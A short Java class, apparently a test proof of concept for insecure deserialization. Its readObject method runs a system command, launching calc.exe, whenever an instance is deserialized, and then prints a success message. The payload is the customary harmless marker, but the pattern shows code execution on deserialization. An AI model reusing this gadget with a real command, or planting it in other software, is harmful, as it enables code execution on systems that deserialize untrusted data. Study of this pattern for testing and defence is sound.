package org.test.exp;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class PublicKnown implements Serializable{
    private void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException{
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
        System.out.println("Call calc.exe success!");
    }
}